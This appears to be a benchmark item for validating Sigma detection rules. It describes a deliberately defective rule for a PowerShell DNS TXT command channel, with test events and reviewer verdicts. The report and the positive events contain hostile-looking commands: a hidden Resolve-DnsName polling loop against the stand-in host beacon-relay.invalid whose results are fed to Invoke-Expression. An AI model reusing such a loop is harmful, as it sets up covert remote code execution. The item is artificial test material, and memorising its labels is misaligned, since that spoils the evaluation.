id: D5-06
role: defective
defect_class: D5
evasive: true
why: 'The rule claims the available category dns_query, yet it contains no condition on QueryName or Image;
  its only discriminating field is ScriptBlockText, which exists only in the PowerShell script block log
  (windows_powershell_script_block, available: false), and the opportunity requires that source.'
expected_gate: G6
report_text: 'A threat actor targeting a logistics software vendor used DNS TXT records as a low-bandwidth
  command channel from PowerShell. The launcher was heavily obfuscated and the process command line did
  not expose the domain. With script block logging (event 4104) enabled, the decoded loop was visible:
  it called Resolve-DnsName with the TXT record type against a per-victim subdomain of beacon-relay.invalid,
  decoded the returned string and passed it to Invoke-Expression. The recovered fragment was: Resolve-DnsName
  -Type TXT -Name ($hostId + ''.beacon-relay.invalid''). Polling occurred about every 90 seconds. We note
  that the DNS responses were short Base64 strings, which kept each exchange small enough to blend into
  normal resolver traffic. The reliable indicator is the script text itself, because the query name varies
  with the victim identifier prefix.'
evidence:
- Resolve-DnsName -Type TXT -Name ($hostId + '.beacon-relay.invalid')
- it called Resolve-DnsName with the TXT record type against a per-victim subdomain of beacon-relay.invalid
logsource: windows_powershell_script_block
techniques:
- T1071.004
- T1059.001
sigma_yaml: |
  title: PowerShell DNS TXT Command Channel To Beacon Relay Domain
  id: 52d8a9f1-0b7e-4c63-9e84-6a1c3f7d2b66
  status: experimental
  description: Detects a PowerShell session that polls TXT records on the relay domain named in the report using Resolve-DnsName.
  references:
    - urn:atidep:case
  author: case-author
  date: 2026/10/02
  tags:
    - attack.command_and_control
    - attack.t1071.004
    - attack.execution
    - attack.t1059.001
  logsource:
    category: dns_query
    product: windows
  detection:
    selection:
      ScriptBlockText|contains|all:
        - Resolve-DnsName
        - '-Type TXT'
        - 'beacon-relay.invalid'
    condition: selection
  falsepositives:
    - Administrators validating TXT records for the relay domain during a change
  level: high
assumptions: []
events:
  positive:
  - kind: process_create
    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    cmd: powershell.exe -NoProfile -Command "Resolve-DnsName -Type TXT -Name ($hostId + '.beacon-relay.invalid')"
    parent: C:\Windows\System32\cmd.exe
    parent_cmd: cmd.exe
    user: LAB\dev-mia
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    cmd: powershell.exe -nop -w hidden -c "while($true){$r = Resolve-DnsName -Type TXT -Name ($hostId
      + '.beacon-relay.invalid'); Start-Sleep 90}"
    parent: C:\Windows\System32\wscript.exe
    parent_cmd: wscript.exe C:\Users\Public\sync.vbs
    user: LAB\dev-mia
    dest_ip: null
    dest_port: null
    name: null
  negative:
  - kind: process_create
    image: C:\Windows\System32\whoami.exe
    cmd: whoami /all
    parent: C:\Windows\System32\cmd.exe
    parent_cmd: cmd.exe
    user: LAB\noah
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Windows\System32\PING.EXE
    cmd: ping.exe fileserver01.corp.example
    parent: C:\Windows\System32\cmd.exe
    parent_cmd: cmd.exe
    user: LAB\noah
    dest_ip: null
    dest_port: null
    name: null
  lookalike:
  - kind: process_create
    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    cmd: powershell.exe -NoProfile -Command "Resolve-DnsName -Type TXT -Name _dmarc.mail.example"
    parent: C:\Windows\System32\cmd.exe
    parent_cmd: cmd.exe
    user: LAB\mailadmin-olga
    dest_ip: null
    dest_port: null
    name: null
tamper_sigma_yaml: ''
review:
  verdicts:
  - reviewer: R1
    role: primary
    verdict: present
    confidence: 80
    reasoning: The detection is ScriptBlockText|contains|all [Resolve-DnsName, '-Type TXT', beacon-relay.invalid],
      so every term lives in script-block text, the unavailable source named as the case's logsource.
      The Sigma logsource is declared as dns_query and the rule never uses QueryName, the only content
      field that source offers. Under dns_query telemetry it could never match, so it needs the unavailable
      script-block telemetry. G6 should block it. The evidence quote is verbatim and the tags (attack.command_and_control,
      attack.t1071.004, attack.execution, attack.t1059.001) match the table.
    events_ok: true
    incidental_issues:
    - The declared dns_query logsource contradicts the field used (ScriptBlockText), so G5 would also
      fail. All events are process_create rather than dns_query, which breaks the contract's event-kind
      rule.
    - A QueryName|endswith beacon-relay.invalid rule would have been feasible on available telemetry.
      The report's claim that only script text is reliable is partly an artefact of how the case was built.
    - The positive events carry the call in CommandLine, and the _dmarc TXT lookalike is a fair benign
      look-alike.
  - reviewer: R2
    role: primary
    verdict: present
    confidence: 72
    reasoning: The detection is a single selection of ScriptBlockText|contains|all (Resolve-DnsName, '-Type
      TXT', beacon-relay.invalid) under logsource category dns_query. The dns_query fields are only Image
      and QueryName, so the rule never uses its declared source's fields. It keys entirely on script-block
      text, which only the unavailable windows_powershell_script_block source provides. The rule therefore
      requires unavailable telemetry, and the available alternative (QueryName endswith beacon-relay.invalid)
      was not used. The caveat is that the declared logsource is available, so G5 would also fire and
      G6 depends on how the gate identifies the required source.
    events_ok: true
    incidental_issues:
    - All events are process_create although the declared log source is dns_query, so no dns_query events
      exist for a rule that claims to be DNS-based.
    - Positive event 2 has a folded line break inside the cmd, which is harmless.
    - The tags are correct (T1071.004, T1059.001), and the look-alike (_dmarc.mail.example TXT lookup)
      is a reasonable benign near-miss.
excluded: false
exclusion_reason: ''
